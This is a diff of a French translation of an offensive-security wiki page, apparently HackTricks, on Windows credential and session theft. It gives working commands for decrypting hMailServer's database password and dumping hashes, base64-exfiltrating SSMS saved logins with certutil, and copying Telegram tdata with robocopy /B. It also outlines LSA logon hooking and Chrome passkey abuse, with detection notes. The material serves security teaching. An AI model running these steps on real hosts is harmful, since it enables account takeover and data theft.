+Vérifiez d’abord que le compte actuel peut lire **à la fois** le fichier INI et le fichier de base de données SQL CE `.sdf` correspondant. Le mot de passe du fichier INI protège la base de données ; il est distinct des hachages des comptes de messagerie qui y sont stockés. Inspectez ou mettez à niveau une **copie** d’une base de données en cours d’utilisation, jamais le fichier actif.
 
 ```python
 from Crypto.Cipher import Blowfish
@@ -407,7 +407,7 @@ plain = swap4(Blowfish.new(key, Blowfish.MODE_ECB).decrypt(swap4(enc))).rstrip(b
 print(plain.decode())
 ```
 
-Avec le mot de passe en clair, copiez la base de données SQL CE pour éviter les verrouillages de fichiers, chargez le fournisseur 32 bits et effectuez une mise à niveau si nécessaire avant d’interroger les hachages :
+Avec le mot de passe en clair, copiez la base de données SQL CE pour éviter les verrous de fichier, chargez le fournisseur 32 bits et effectuez une mise à niveau si nécessaire avant d’interroger les hashes :
 
 ```powershell
 Copy-Item "C:\Program Files (x86)\hMailServer\Database\hMailServer.sdf" C:\Windows\Temp\
@@ -418,44 +418,44 @@ $conn = New-Object System.Data.SqlServerCe.SqlCeConnection("Data Source=C:\Windo
 $cmd = $conn.CreateCommand(); $cmd.CommandText = "SELECT accountaddress,accountpassword FROM hm_accounts"; $cmd.ExecuteReader()
 ```
 
-The column `accountpassword` utilise le format de hachage hMailServer (mode `1421` de hashcat). Un mot de passe de boîte mail cracké ne permet un pivot vers un utilisateur Windows que si ce mot de passe est réutilisé par un compte local ou de domaine disposant des droits de connexion à distance nécessaires.
+La colonne `accountpassword` utilise le format de hash hMailServer (mode hashcat `1421`). Un mot de passe de boîte aux lettres cracké ne permet un pivot vers un utilisateur Windows que si ce mot de passe est réutilisé par un compte local/de domaine et que ce compte dispose des droits de connexion à distance requis.
 
-## LSA Logon Callback Interception (LsaApLogonUserEx2)
+## Interception du callback de connexion LSA (LsaApLogonUserEx2)
 
-Certains outils capturent les **mots de passe de connexion en clair** en interceptant le callback de connexion LSA `LsaApLogonUserEx2`. L’idée consiste à hooker ou à envelopper le callback du package d’authentification afin de capturer les identifiants **lors de la connexion** (avant le hachage), puis de les écrire sur disque ou de les renvoyer à l’opérateur. Cette méthode est généralement mise en œuvre à l’aide d’un helper injecté dans LSA ou enregistré auprès de celui-ci, qui consigne ensuite chaque événement de connexion interactive ou réseau réussi avec le nom d’utilisateur, le domaine et le mot de passe.<sup>[[1]](#references)</sup>
+Certains outils capturent les **mots de passe de connexion en clair** en interceptant le callback de connexion LSA `LsaApLogonUserEx2`. L’idée consiste à hooker ou à envelopper le callback du package d’authentification afin de capturer les identifiants **pendant la connexion** (avant le hachage), puis de les écrire sur le disque ou de les renvoyer à l’opérateur. Cette méthode est généralement mise en œuvre au moyen d’un helper qui s’injecte dans LSA ou s’y enregistre, puis consigne chaque événement de connexion interactive/réseau réussi avec le nom d’utilisateur, le domaine et le mot de passe.<sup>[[1]](#references)</sup>
 
 Notes opérationnelles :
-- Nécessite des privilèges d’administrateur local ou SYSTEM pour charger le helper dans le chemin d’authentification.
+- Nécessite les droits d’administrateur local/SYSTEM pour charger le helper dans le chemin d’authentification.
 - Les identifiants capturés n’apparaissent qu’au moment d’une connexion (interactive, RDP, de service ou réseau, selon le hook).
 
 ## Identifiants de connexion enregistrés dans SSMS (sqlstudio.bin)
 
-SQL Server Management Studio (SSMS) stocke les informations de connexion enregistrées dans un fichier `sqlstudio.bin` propre à chaque utilisateur. Des outils dédiés peuvent analyser ce fichier et récupérer les identifiants SQL enregistrés. Dans les shells qui ne renvoient que la sortie des commandes, le fichier est souvent exfiltré en l’encodant en Base64 et en l’affichant sur stdout.<sup>[[1]](#references)</sup>
+SQL Server Management Studio (SSMS) stocke les informations de connexion enregistrées dans un fichier `sqlstudio.bin` propre à chaque utilisateur. Des outils dédiés peuvent analyser le fichier et récupérer les identifiants SQL enregistrés. Dans les shells qui ne renvoient que la sortie des commandes, le fichier est souvent exfiltré en l’encodant en Base64 et en l’affichant sur stdout.<sup>[[1]](#references)</sup>
 
 ```cmd
 certutil -encode sqlstudio.bin sqlstudio.b64
 type sqlstudio.b64
 ```
 
-Du côté de l’opérateur, reconstruisez le fichier et exécutez le dumper localement pour récupérer les identifiants :
+Côté opérateur, reconstruisez le fichier et exécutez le dumper localement pour récupérer les identifiants :
 
 ```bash
 base64 -d sqlstudio.b64 > sqlstudio.bin
 ```
 
-## Vol de session de navigateur et de cookies via Chrome DevTools Protocol
+## Vol de sessions de navigateur et de cookies via Chrome DevTools Protocol
 
 {{#ref}}
 ../../linux-hardening/software-information/electron-cef-chromium-debugger-abuse.md#enabling-cdp-inside-a-live-chromium-process
 {{#endref}}
 
-## Vol de session `tdata` de Telegram Desktop
+## Vol de session Telegram Desktop `tdata`
 
-Telegram Desktop conserve les informations d’autorisation et l’état du compte dans son répertoire **`tdata`**. Une session copiée peut être chargée à l’aide d’outils compatibles pour s’authentifier sans le mot de passe du compte tant que cette autorisation reste valide ; si le chiffrement des données locales est activé, le voleur doit également disposer du code d’accès. Une session authentifiée peut alors révéler des données d’identité, des métadonnées sur les conversations et les appartenances, des messages et des médias téléchargeables.<sup>[[10]](#references)</sup>
+Telegram Desktop conserve les données d’autorisation et l’état du compte dans son répertoire **`tdata`**. Une session copiée peut être chargée avec des outils compatibles pour s’authentifier sans le mot de passe du compte, tant que cette autorisation reste valide ; si le chiffrement des données locales est activé, le stealer a également besoin du code d’accès. Une session authentifiée peut alors révéler des données d’identité, des métadonnées de conversation et d’appartenance, des messages et des médias téléchargeables.<sup>[[10]](#references)</sup>
 
-### Recherche et récupération
+### Détection et acquisition
 
-Recherchez dans les installations classiques et portables ; les noms des packages du Microsoft Store varient, énumérez donc les répertoires de packages contenant `TelegramMessenge` et inspectez leur sous-répertoire `LocalCache\Roaming`.<sup>[[10]](#references)</sup>
+Recherchez les installations standard et portables ; les noms des packages Microsoft Store varient, alors énumérez les répertoires de packages contenant `TelegramMessenge` et inspectez leur sous-arborescence `LocalCache\Roaming`.<sup>[[10]](#references)</sup>
 
 ```powershell
 # Standard Telegram Desktop installation
@@ -470,24 +470,24 @@ Get-ChildItem "$env:LOCALAPPDATA\Packages" -Directory |
 Get-ChildItem C:\ -Recurse -Directory -Filter tdata -ErrorAction SilentlyContinue
 ```
 
-Si les lectures ordinaires échouent et que le jeton du processus **contient déjà et active** `SeBackupPrivilege`, l’accès tenant compte des sauvegardes offre une solution de repli ; il n’obtient pas le privilège et n’élève pas les droits du processus. `CreateFileW` avec `FILE_FLAG_BACKUP_SEMANTICS` peut demander une sémantique de sauvegarde/restauration et contourner les vérifications de sécurité des fichiers lorsque les privilèges requis sont présents dans le jeton, mais le seul indicateur ne contourne pas un verrou de partage incompatible.<sup>[[10]](#references)[[11]](#references)</sup>
+Si les lectures ordinaires échouent et que le jeton du processus **contient déjà et active** `SeBackupPrivilege`, l’accès compatible avec le mode sauvegarde constitue une solution de repli ; il n’obtient pas le privilège et n’élève pas les privilèges du processus. `CreateFileW` avec `FILE_FLAG_BACKUP_SEMANTICS` peut demander la sémantique de sauvegarde/restauration et contourner les contrôles de sécurité des fichiers lorsque les privilèges requis sont présents dans le jeton, mais l’indicateur seul ne permet pas de contourner un verrou de partage incompatible.<sup>[[10]](#references)[[11]](#references)</sup>
 
-Pour les fichiers verrouillés en cours d’utilisation, créez/lisez une **Volume Shadow Copy** ; pour les fichiers bloqués par les ACL, `robocopy /B` utilise le mode sauvegarde et contourne les ACL des fichiers et des répertoires.<sup>[[10]](#references)[[12]](#references)</sup>
+Pour les fichiers verrouillés en cours d’utilisation, créez/lisez une **Volume Shadow Copy** ; pour les fichiers bloqués par des ACL, `robocopy /B` utilise le mode sauvegarde et contourne les ACL des fichiers et des répertoires.<sup>[[10]](#references)[[12]](#references)</sup>
 
 ```cmd
 whoami /priv
 robocopy "%APPDATA%\Telegram Desktop\tdata" "C:\Temp\tdata" /E /B
 ```
 
-Un implant soucieux de la bande passante peut d’abord envoyer uniquement l’inventaire des chemins de fichiers, recevoir un identifiant d’instantané ainsi que la liste des chemins déjà stockés par le C2, puis téléverser uniquement les fichiers manquants. Par conséquent, de petits transferts incrémentiels après l’énumération récursive de `tdata` peuvent tout de même indiquer un vol de session réussi.<sup>[[10]](#references)</sup>
+Un implant soucieux de la bande passante peut d’abord envoyer uniquement l’inventaire des chemins de fichiers, recevoir un identifiant de snapshot ainsi que les chemins déjà stockés par le C2, puis téléverser uniquement les fichiers manquants. Par conséquent, de petits transferts incrémentiels après l’énumération récursive de `tdata` peuvent tout de même indiquer un vol de session réussi.<sup>[[10]](#references)</sup>
 
 ### Détection et confinement
 
-Corrélez les accès récursifs à `tdata` par un processus autre que Telegram avec l’activation de `SeBackupPrivilege`, l’ouverture de fichiers avec les sémantiques de sauvegarde, l’activité VSS ou un processus enfant `robocopy.exe` utilisant `/B`. Recherchez également l’énumération rapide de `%APPDATA%` et de `%LOCALAPPDATA%\Packages`, suivie de connexions sortantes depuis le même processus. Après une compromission, utilisez **Paramètres → Appareils** (ou **Confidentialité et sécurité → Sessions actives**) pour mettre fin aux sessions non reconnues ; activer la validation en deux étapes ne révoque pas une autorisation déjà volée.<sup>[[10]](#references)[[13]](#references)</sup>
+Corrélez l’accès récursif à `tdata` par un processus autre que Telegram avec l’activation de `SeBackupPrivilege`, l’ouverture de fichiers avec la sémantique de sauvegarde, l’activité VSS ou un processus enfant `robocopy.exe` utilisant `/B`. Recherchez également une énumération rapide de `%APPDATA%` et de `%LOCALAPPDATA%\Packages`, suivie de connexions sortantes depuis le même processus. Après une compromission, utilisez **Paramètres → Appareils** (ou **Confidentialité et sécurité → Sessions actives**) pour mettre fin aux sessions non reconnues ; activer la validation en deux étapes ne révoque pas une autorisation déjà volée.<sup>[[10]](#references)[[13]](#references)</sup>
 
 ## Vol de credentials Passkeys / WebAuthn depuis Chrome sous Windows
 
-Si une exécution de code est obtenue en tant qu’**utilisateur victime** sur un hôte Windows utilisant **Chrome + des passkeys synchronisées dans Google Password Manager**, les passkeys deviennent une cible intéressante après l’exploitation, même **sans admin/SYSTEM**.<sup>[[4]](#references)</sup>
+Si une exécution de code est obtenue en tant que **compte utilisateur victime** sur un hôte Windows utilisant **Chrome + des passkeys synchronisées via Google Password Manager**, les passkeys deviennent une cible intéressante après exploitation, même **sans droits admin/SYSTEM**.<sup>[[4]](#references)</sup>
 
 ### Artefacts locaux intéressants
 
@@ -507,9 +507,9 @@ Get-ChildItem "$env:LOCALAPPDATA\Google\Chrome\User Data" -Recurse -Force |
   Select-Object FullName, Length, LastWriteTime
 ```
 
-### Les blobs de clé liés au TPM peuvent tout de même être détournés comme oracle de signature local
+### Les blobs de clés liés au TPM peuvent quand même être exploités comme oracle de signature local
 
-Si le navigateur exporte une clé d’identité protégée par le TPM sous forme de **`NCRYPT_OPAQUE_KEY_BLOB`** et stocke ce blob dans un état accessible à l’utilisateur, un malware n’a **pas** besoin d’extraire la clé privée brute. Il peut simplement réimporter le blob sur la **même machine** et demander au TPM local de signer des données contrôlées par l’attaquant :<sup>[[4]](#references)[[6]](#references)</sup>
+Si le navigateur exporte une clé d’identité protégée par le TPM sous forme de **`NCRYPT_OPAQUE_KEY_BLOB`** et stocke ce blob dans un emplacement accessible à l’utilisateur, le malware n’a **pas** besoin d’extraire la clé privée brute. Il peut simplement réimporter le blob sur la **même machine** et demander au TPM local de signer des données contrôlées par l’attaquant :<sup>[[4]](#references)[[6]](#references)</sup>
 
 ```c
 NCryptOpenStorageProvider(...)
@@ -517,46 +517,48 @@ NCryptImportKey(..., NCRYPT_OPAQUE_KEY_BLOB, ...)
 NCryptSignHash(...)
 ```
 
-Cela signifie que **le binding matériel empêche l’export hors de l’appareil, mais pas l’utilisation par le même utilisateur sur le endpoint compromis**.
+Cela signifie que le **binding matériel empêche l’export hors de l’appareil, mais pas l’utilisation par le même utilisateur sur le terminal compromis**.
 
-### Voies d’abus pratiques
+### Voies d’exploitation pratiques
 
-1. **Pass-ta-key / relais d’identité de l’appareil**<sup>[[4]](#references)</sup>
+1. **Relais Pass-ta-key / identité de l’appareil**<sup>[[4]](#references)</sup>
    - Énumérer les `WebauthnCredentialSpecifics` dans le LevelDB de Chrome.
    - Démarrer une connexion par passkey et obtenir un nouveau challenge WebAuthn.
-   - Utiliser le blob `wrapped_identity_private_key` volé sur le TPM de la victime pour signer le binding de la requête cloud-authenticator.
-   - Relayer l’assertion obtenue au relying party.
-   - Cette technique est particulièrement intéressante lorsque le RP accepte `userVerification=preferred` ou ne rejette pas les assertions avec **`UV=0`**.
+   - Utiliser le blob `wrapped_identity_private_key` volé sur le TPM de la victime pour signer la liaison de la requête du cloud-authenticator.
+   - Relayer l’assertion renvoyée au relying party.
+   - Cette technique est particulièrement utile lorsque le RP accepte `userVerification=preferred` ou ne rejette pas les assertions avec **`UV=0`**.
 2. **Détournement d’une clé UV en attente**<sup>[[4]](#references)</sup>
-   - Forcer un nouvel enrôlement en supprimant `passkey_enclave_state` ou en envoyant une opération `device/forget` correctement signée.
-   - Si l’enrôlement laisse l’appareil dans l’état **`uv_key_pending`**, enregistrer une clé publique UV contrôlée par l’attaquant.
-   - Si le fournisseur ne vérifie pas l’attestation / l’origine matérielle sécurisée de la nouvelle clé UV, les signatures ultérieures de la clé de l’attaquant sont considérées comme **`UV=1`**.
-3. **Vol du secret maître / de la récupération SDS**<sup>[[4]](#references)</sup>
-   - Forcer une récupération ou une nouvelle jonction pour que Chrome récupère le secret maître des passkeys synchronisées.
-   - Surveiller la recréation ou la modification de `passkey_enclave_state`, puis vider la mémoire de Chrome lorsque le texte en clair du **secret du domaine de sécurité (SDS)** y est présent.
-   - Utiliser le SDS récupéré pour déchiffrer les champs chiffrés de chaque enregistrement `WebauthnCredentialSpecifics` et récupérer les clés privées WebAuthn portables.
+   - Forcer une nouvelle configuration en supprimant `passkey_enclave_state` ou en envoyant une opération `device/forget` signée et valide.
+   - Si la configuration laisse l’appareil dans l’état **`uv_key_pending`**, enregistrer une clé publique UV contrôlée par l’attaquant.
+   - Si le fournisseur ne vérifie pas l’attestation / la provenance du matériel sécurisé pour la nouvelle clé UV, les signatures ultérieures de la clé de l’attaquant sont considérées comme **`UV=1`**.
+3. **Vol du secret maître / récupération du SDS**<sup>[[4]](#references)</sup>
+   - Forcer une récupération ou une nouvelle adhésion afin que Chrome récupère le secret maître des passkeys synchronisées.
+   - Surveiller la recréation ou la modification de `passkey_enclave_state`, puis vider la mémoire de Chrome lorsque le **secret du domaine de sécurité (SDS)** en clair y réside.
+   - Utiliser le SDS récupéré pour déchiffrer les champs chiffrés de chaque enregistrement `WebauthnCredentialSpecifics` et récupérer des clés privées WebAuthn exportables.
 
 ### Idées pour le DFIR / la détection
 
 - Surveiller la **suppression/recréation** de `passkey_enclave_state`.<sup>[[4]](#references)</sup>
 - Déclencher une alerte en cas d’accès anormal à **`Sync Data\LevelDB`** de Chrome par des processus autres que le navigateur.
 - Déclencher une alerte en cas de **vidage de la mémoire de Chrome** ou d’accès suspect à la mémoire entre processus.
-- Examiner les demandes répétées de **code PIN de récupération de Google Password Manager** ou les réenrôlements inattendus.
-- Garder à l’esprit que le **`signCount`** de WebAuthn est souvent peu utile pour les passkeys synchronisées, car il peut rester constant ; la détection classique des clones est donc peu efficace.
+- Enquêter sur les demandes répétées du **PIN de récupération de Google Password Manager** ou sur toute nouvelle configuration inattendue.
+- Garder à l’esprit que le **`signCount`** de WebAuthn est souvent peu utile pour les passkeys synchronisées, car il peut rester constant ; la détection classique des clones est donc peu fiable.
 
 ## References
 
 - [1] [Unit 42 – Enquête sur des années d’opérations non détectées ciblant des secteurs de grande valeur](https://unit42.paloaltonetworks.com/cl-unk-1068-targets-critical-sectors/)
-- [2] [0xdf – HTB/VulnLab JobTwo : hameçonnage par macro VBA Word via SMTP → déchiffrement des identifiants hMailServer → Veeam CVE-2023-27532 vers SYSTEM](https://0xdf.gitlab.io/2026/01/27/htb-jobtwo.html)
-- [3] [Check Point Research – Au cœur d’Ink Dragon : révélation du réseau de relais et du fonctionnement interne d’une opération offensive furtive](https://research.checkpoint.com/2025/ink-dragons-relay-network-and-offensive-operation/)
+- [2] [0xdf – HTB/VulnLab JobTwo : hameçonnage par macro Word VBA via SMTP → déchiffrement des identifiants hMailServer → Veeam CVE-2023-27532 vers SYSTEM](https://0xdf.gitlab.io/2026/01/27/htb-jobtwo.html)
+- [3] [Check Point Research – Dans les coulisses d’Ink Dragon : révélation du réseau de relais et du fonctionnement interne d’une opération offensive furtive](https://research.checkpoint.com/2025/ink-dragons-relay-network-and-offensive-operation/)
 - [4] [Unit 42 – Pass the Passkey : une nouvelle surface d’attaque dans l’authentification sans mot de passe](https://unit42.paloaltonetworks.com/passwordless-authentication-security-risks/)
 - [5] [Chromium – `webauthn_credential_specifics.proto`](https://chromium.googlesource.com/chromium/src/+/main/components/sync/protocol/webauthn_credential_specifics.proto)
-- [6] [Microsoft – `NCryptCreatePersistedKey` / stockage des clés CNG](https://learn.microsoft.com/en-us/windows/win32/api/ncrypt/nf-ncrypt-ncryptcreatepersistedkey)
-- [7] [0xWord – Hacking Windows : attaques sur les systèmes et réseaux Microsoft](https://0xword.com/es/libros/99-hacking-windows-ataques-a-sistemas-y-redes-microsoft.html)
+- [6] [Microsoft – `NCryptCreatePersistedKey` / stockage de clés CNG](https://learn.microsoft.com/en-us/windows/win32/api/ncrypt/nf-ncrypt-ncryptcreatepersistedkey)
+- [7] [0xWord – Hacking Windows: Ataques a Sistemas y Redes Microsoft](https://0xword.com/es/libros/99-hacking-windows-ataques-a-sistemas-y-redes-microsoft.html)
 - [8] [Comment fonctionne réellement le magasin de données Active Directory : au cœur de NTDS.dit (partie 1)](https://blog.chrisse.se/?p=762)
-- [9] [en.hackndo.com - Extraction à distance des mots de passe de Lsass](https://en.hackndo.com/remote-lsass-dump-passwords)
-- [10] [Kaspersky Securelist – Armored Likho étoffe son arsenal de cyberespionnage avec le toolkit Still](https://securelist.com/armored-likho-still-toolkit/121033)
+- [9] [en.hackndo.com – Vidage distant de Lsass pour récupérer des mots de passe](https://en.hackndo.com/remote-lsass-dump-passwords)
+- [10] [Kaspersky Securelist – Armored Likho élargit son arsenal de cyberespionnage avec le toolkit Still](https://securelist.com/armored-likho-still-toolkit/121033)
 - [11] [Microsoft Learn – Fonction CreateFileW et `FILE_FLAG_BACKUP_SEMANTICS`](https://learn.microsoft.com/en-us/windows/win32/api/fileapi/nf-fileapi-createfilew)
 - [12] [Microsoft Learn – Mode de sauvegarde Robocopy `/B`](https://learn.microsoft.com/en-us/windows-server/administration/windows-commands/robocopy)
 - [13] [FAQ Telegram – mettre fin aux sessions actives](https://telegram.org/faq)
+- [14] [Microsoft Learn : Remote Credential Guard et Restricted Admin](https://learn.microsoft.com/en-us/windows/security/identity-protection/remote-credential-guard)
+- [15] [Microsoft Learn : protection et gestion des identifiants](https://learn.microsoft.com/en-us/windows-server/security/credentials-protection-and-management/credentials-protection-and-management)
 {{#include ../../banners/hacktricks-training.md}}
